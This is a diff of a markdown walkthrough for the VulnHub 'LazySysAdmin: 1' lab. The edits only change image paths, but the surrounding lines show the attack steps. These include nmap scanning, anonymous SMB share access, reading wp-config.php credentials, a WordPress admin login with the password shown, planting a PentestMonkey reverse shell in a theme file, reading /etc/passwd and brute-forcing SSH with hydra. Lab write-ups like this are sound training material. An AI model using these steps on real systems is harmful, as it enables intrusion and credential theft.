@@ -3,7 +3,7 @@
 - **Machine:** LazySysAdmin: 1
 - **Download:** http://vulnhub.com/entry/lazysysadmin-1,205/
 
-![](797-1.png)
+![](images/797-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](797-2.png)
+![](images/797-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Perform a complete scan to enumerate all ports, services, operating system detai
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.227
 ```
 
-![](797-3.png)
+![](images/797-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ Run the `http-enum` NSE script to discover hidden web resources.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.166
 ```
 
-![](797-4.png)
+![](images/797-4.png)
 
 ---
 
@@ -72,7 +72,7 @@ List the available SMB shares.
 smbclient -L //192.168.2.166 -N
 ```
 
-![](797-5.png)
+![](images/797-5.png)
 
 Connect to the discovered share.
 
@@ -80,7 +80,7 @@ Connect to the discovered share.
 smbclient //192.168.2.166/share$ -N
 ```
 
-![](797-6.png)
+![](images/797-6.png)
 
 Download the interesting files.
 
@@ -96,9 +96,9 @@ get robots.txt /home/anish/Documents/Vulnhub/robots.txt
 get todolist.txt /home/anish/Documents/Vulnhub/todolist.txt
 ```
 
-![](797-7.png)
+![](images/797-7.png)
 
-![](797-8.png)
+![](images/797-8.png)
 
 Navigate to the WordPress directory.
 
@@ -106,7 +106,7 @@ Navigate to the WordPress directory.
 cd wordpress
 ```
 
-![](797-9.png)
+![](images/797-9.png)
 
 Download the WordPress configuration file.
 
@@ -120,7 +120,7 @@ Read the configuration file.
 cat wp-config.php
 ```
 
-![](797-10.png)
+![](images/797-10.png)
 
 Database credentials are exposed.
 
@@ -151,7 +151,7 @@ Enumerate WordPress users.
 wpscan --url http://192.168.2.166/wordpress -e u
 ```
 
-![](797-11.png)
+![](images/797-11.png)
 
 Login to the WordPress admin panel.
 
@@ -162,7 +162,7 @@ Username : Admin
 Password : TogieMYSQL12345^^
 ```
 
-![](797-12.png)
+![](images/797-12.png)
 
 Successfully logged into the WordPress dashboard.
 
@@ -176,7 +176,7 @@ Navigate to:
 Appearance → Editor → Twenty Fifteen → 404.php
 ```
 
-![](797-13.png)
+![](images/797-13.png)
 
 Replace the existing PHP code with the **PentestMonkey PHP Reverse Shell**.
 
@@ -196,7 +196,7 @@ http://192.168.2.166/wordpress/wp-content/themes/twentyfifteen/404.php
 
 A reverse shell is successfully established.
 
-![](797-14.png)
+![](images/797-14.png)
 
 ---
 
@@ -208,7 +208,7 @@ Enumerate the local users.
 cat /etc/passwd
 ```
 
-![](797-15.png)
+![](images/797-15.png)
 
 A normal user named **togie** is identified.
 
@@ -218,7 +218,7 @@ Brute-force the SSH password.
 hydra -l togie -P /opt/rockyou.txt ssh://192.168.2.166
 ```
 
-![](797-16.png)
+![](images/797-16.png)
 
 Recovered credentials:
 
@@ -233,7 +233,7 @@ Login via SSH.
 ssh togie@192.168.2.166
 ```
 
-![](797-17.png)
+![](images/797-17.png)
 
 SSH access is successfully obtained.
 
